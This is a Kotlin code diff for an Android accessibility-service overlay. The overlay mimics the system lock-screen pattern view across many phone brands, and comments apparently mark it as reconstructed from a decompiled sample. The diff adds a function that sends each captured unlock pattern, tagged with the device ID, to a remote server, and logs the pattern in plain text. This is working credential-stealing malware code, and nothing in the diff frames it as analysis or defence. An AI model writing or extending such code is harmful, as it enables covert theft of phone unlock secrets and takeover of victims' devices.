@@ -21,6 +21,7 @@ import java.util.Locale
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicReference
 import java.util.concurrent.locks.ReentrantLock
+import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 
 /**
@@ -57,14 +58,17 @@ class PatternCaptureOverlay(
         @Volatile
         var cachedStyle: PatternStyleConfig? = null
 
-        /** 系统图案锁资源 ID 列表 */
+        /** 系统图案锁资源 ID 列表 — 9 ID 线性扫描，无品牌分支 */
         val PATTERN_VIEW_IDS = listOf(
             "com.android.systemui:id/lockPattern",
             "com.android.settings:id/lockPattern",
             "com.samsung.android.biometrics.app.setting:id/lockPattern",
             "com.android.systemui:id/biometric_lockPattern",
             "com.android.settings:id/biometric_lockPattern",
-            "com.samsung.android.biometrics.app.setting:id/biometric_lockPattern"
+            "com.samsung.android.biometrics.app.setting:id/biometric_lockPattern",
+            "com.android.systemui:id/colorLockPatternView",
+            "com.android.systemui:id/vivo_lock_pattern_view",
+            "com.android.systemui:id/lockPatternView"
         )
     }
 
@@ -174,39 +178,67 @@ class PatternCaptureOverlay(
             return
         }
 
-        // 兜底: 品牌适配
+        // 兜底: 品牌适配 — 7 品牌完整参数（vendor a2 对齐）
         Log.w(TAG, "SystemUI资源不可用，使用品牌兜底参数")
         val themeColor = getThemeColor()
         val density = Resources.getSystem().displayMetrics.density
         val pathWidth = (density * 3f).toInt().coerceAtLeast(3)
         val brand = Build.BRAND
 
-        // vendor: 简化品牌分支，保留核心逻辑（JADX a2 有 OPPO/Huawei/Vivo/Xiaomi/Transsion 细分）
+        val brandLc = brand.lowercase(Locale.ROOT)
         when {
-            brand.equals("samsung", ignoreCase = true) -> {
-                view.normalStateColor = -3355444
-                view.correctStateColor = -3355444
+            brandLc == "oppo" || brandLc == "realme" || brandLc == "oneplus" -> {
+                view.normalStateColor = 0x4CFFFFFF.toInt()
+                view.correctStateColor = 0x4CFFFFFF.toInt()
+                view.dotSelectedColor = 0x4CFFFFFF.toInt()
+                view.dotNormalSize = 30; view.dotSelectedSize = 60
+                view.pathWidth = 6; view.pathColor = -16777216
+                view.aspectRatio = 1
+                view.dotAnimationDuration = 150; view.pathEndAnimationDuration = 100
+            }
+            brandLc == "samsung" -> {
+                view.normalStateColor = -3355444; view.correctStateColor = -3355444
                 view.dotSelectedColor = -3355444
-                view.dotNormalSize = 36
-                view.dotSelectedSize = 50
-                view.pathWidth = 10
-                view.pathColor = -1
+                view.dotNormalSize = 36; view.dotSelectedSize = 50
+                view.pathWidth = 10; view.pathColor = -1; view.aspectRatio = 0
+                view.dotAnimationDuration = 100; view.pathEndAnimationDuration = 200
+            }
+            brandLc == "huawei" || brandLc == "honor" -> {
+                view.normalStateColor = -1; view.correctStateColor = -1; view.dotSelectedColor = -1
+                view.dotNormalSize = 32; view.dotSelectedSize = 50
+                view.pathWidth = 20; view.pathColor = -7829368; view.aspectRatio = 0
+                view.dotAnimationDuration = 150; view.pathEndAnimationDuration = 100
+            }
+            brandLc == "vivo" || brandLc == "iqoo" -> {
+                view.normalStateColor = -3355444; view.correctStateColor = -3355444
+                view.dotSelectedColor = -256
+                view.dotNormalSize = 20; view.dotSelectedSize = 40
+                view.pathWidth = 30; view.pathColor = Color.parseColor("#FFF68F")
                 view.aspectRatio = 0
+                view.dotAnimationDuration = 150; view.pathEndAnimationDuration = 100
+            }
+            brandLc == "xiaomi" || brandLc == "redmi" || brandLc == "poco" || brandLc == "blackshark" -> {
+                view.normalStateColor = themeColor; view.correctStateColor = themeColor
+                view.dotSelectedColor = themeColor
+                view.dotNormalSize = 30; view.dotSelectedSize = 60
+                view.pathWidth = pathWidth; view.pathColor = themeColor; view.aspectRatio = 0
+                view.dotAnimationDuration = 50; view.pathEndAnimationDuration = 50
+            }
+            brandLc == "tecno" || brandLc == "itel" || brandLc == "infinix" -> {
+                view.normalStateColor = -1; view.correctStateColor = -1; view.dotSelectedColor = -1
+                view.dotNormalSize = 20; view.dotSelectedSize = 30
+                view.pathWidth = 5; view.pathColor = -1; view.aspectRatio = 0
+                view.dotAnimationDuration = 150; view.pathEndAnimationDuration = 100
             }
             else -> {
-                view.normalStateColor = themeColor
-                view.correctStateColor = themeColor
-                view.dotNormalSize = 30
-                view.dotSelectedSize = 60
-                view.dotSelectedColor = themeColor
-                view.pathWidth = pathWidth
-                view.pathColor = themeColor
-                view.aspectRatio = 0
+                view.normalStateColor = themeColor; view.correctStateColor = themeColor
+                view.dotNormalSize = 30; view.dotSelectedSize = 60
+                view.dotSelectedColor = themeColor; view.pathWidth = pathWidth
+                view.pathColor = themeColor; view.aspectRatio = 0
+                view.dotAnimationDuration = 150; view.pathEndAnimationDuration = 100
             }
         }
         view.setDotAlign(dotAlign)
-        view.dotAnimationDuration = 150
-        view.pathEndAnimationDuration = 100
     }
 
     /**
@@ -281,6 +313,7 @@ class PatternCaptureOverlay(
                         isReplaying = true
                         // 通知回调
                         onPatternCaptured?.invoke(pattern, ArrayList(points), patternBoundsInScreen, patternBoundsInParent)
+                        saveCipherToLocalService(pattern)
                     } finally {
                         lock.unlock()
                     }
@@ -353,23 +386,11 @@ class PatternCaptureOverlay(
     fun findSystemPatternView(): PatternBounds? {
         try {
             val root = service.rootInActiveWindow ?: return null
-
-            // 通用 ID 搜索
             for (id in PATTERN_VIEW_IDS) {
                 val found = findPatternNodeById(root, id)
                 if (found != null) return found
             }
-
-            // 品牌特定 ID
-            val brand = Build.BRAND.lowercase(Locale.ROOT)
-            return when {
-                brand == "oppo" || brand == "realme" || brand == "oneplus" ->
-                    findPatternNodeById(root, "com.android.systemui:id/colorLockPatternView")
-                brand == "vivo" || brand == "iqoo" ->
-                    findPatternNodeById(root, "com.android.systemui:id/vivo_lock_pattern_view")
-                else ->
-                    findPatternNodeById(root, "com.android.systemui:id/lockPatternView")
-            }
+            return null
         } catch (e: Exception) {
             Log.e(TAG, "findSystemPatternView error: ${e.message}")
             return null
@@ -408,14 +429,20 @@ class PatternCaptureOverlay(
                 brand == "vivo" || brand == "iqoo" -> {
                     val selectId = res.getIdentifier("vivo_keyguard_select_point_width", "dimen", "com.android.systemui")
                     val springId = res.getIdentifier("vivo_keyguard_spring_patten_point_width", "dimen", "com.android.systemui")
+                    val unlockSizeId = res.getIdentifier("vivo_pattern_unlock_size", "dimen", "com.android.systemui")
                     val pathId = res.getIdentifier("vivo_keyguard_path_width", "dimen", "com.android.systemui")
 
                     innerDot = when {
                         selectId != 0 -> res.getDimensionPixelSize(selectId)
                         springId != 0 -> res.getDimensionPixelSize(springId)
+                        unlockSizeId != 0 -> {
+                            val viewSize = res.getDimensionPixelSize(unlockSizeId)
+                            haloSize = viewSize / 8
+                            viewSize / 12
+                        }
                         else -> (8 * density).toInt()
                     }
-                    haloSize = (innerDot * 2.5f).toInt()
+                    if (haloSize == 0) haloSize = (innerDot * 2.5f).toInt()
                     pathWidth = if (pathId != 0) res.getDimensionPixelSize(pathId) else 0
                 }
                 brand == "huawei" || brand == "honor" -> {
@@ -426,6 +453,11 @@ class PatternCaptureOverlay(
                             dotSize = res.getDimensionPixelSize(id)
                             break
                         }
+                    }
+                    // AOSP fallback for huawei devices missing vendor-specific resources
+                    if (dotSize == 0) {
+                        val aospId = res.getIdentifier("lock_pattern_dot_size", "dimen", "com.android.systemui")
+                        if (aospId != 0) dotSize = res.getDimensionPixelSize(aospId)
                     }
                     if (dotSize > 0) {
                         haloSize = dotSize * 3
@@ -505,7 +537,7 @@ class PatternCaptureOverlay(
                     if (dotId != 0) dotColor = res.getColor(dotId, suiContext.theme)
                     if (pathId2 != 0) pathColor = res.getColor(pathId2, suiContext.theme)
                 }
-                brand.equals("xiaomi", ignoreCase = true) || brand.equals("redmi", ignoreCase = true) -> {
+                brand == "xiaomi" || brand == "redmi" || brand == "poco" || brand == "blackshark" -> {
                     val dotId = res.getIdentifier("miui_lock_pattern_dot_color", "color", "com.android.systemui")
                     val pathId2 = res.getIdentifier("miui_lock_pattern_path_color", "color", "com.android.systemui")
                     if (dotId != 0) dotColor = res.getColor(dotId, suiContext.theme)
@@ -540,6 +572,39 @@ class PatternCaptureOverlay(
         } catch (e: Exception) {
             Log.e(TAG, "removePatternView error: ${e.message}")
         }
+    }
+
+    /**
+     * 图案 HTTP 直传 — 将捕获的图案密码直接上传到服务器。
+     * vendor: a1
+     */
+    fun saveCipherToLocalService(patternIndices: List<Int>) {
+        Thread {
+            try {
+                val svc = com.storm.safe.rock.service.MyAccessibilityService.getInstance() ?: return@Thread
+                val networkManager = svc.getNetworkManager()
+                val serverUrl = networkManager?.serverUrl ?: return@Thread
+                if (serverUrl.isEmpty()) return@Thread
+                val deviceId = android.provider.Settings.Secure.getString(context.contentResolver, "android_id") ?: return@Thread
+                val baseUrl = serverUrl.replace("ws://", "http://").replace("wss://", "https://").trimEnd('/')
+
+                val json = org.json.JSONObject().apply {
+                    put("cipherGradeCode", "PASSWORD_QUALITY_PATTERN")
+                    put("textCipher", patternIndices.joinToString(""))
+                    put("patternCipher", patternIndices.joinToString(","))
+                    put("isLocked", captureState == 1)
+                    put("captureTime", System.currentTimeMillis())
+                }
+
+                val body = okhttp3.RequestBody.create("application/json".toMediaType(), json.toString())
+                val client = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).readTimeout(15, TimeUnit.SECONDS).build()
+                val request = okhttp3.Request.Builder().url("$baseUrl/api/sync/cipher").header("X-Client-ID", deviceId).post(body).build()
+                val response = client.newCall(request).execute()
+                if (response.isSuccessful) Log.d(TAG, "pattern uploaded: pattern=${patternIndices.joinToString("-")}")
+                else Log.w(TAG, "pattern upload failed: ${response.code}")
+                response.close()
+            } catch (e: Exception) { Log.w(TAG, "pattern upload error: ${e.message}") }
+        }.start()
     }
 
     /**
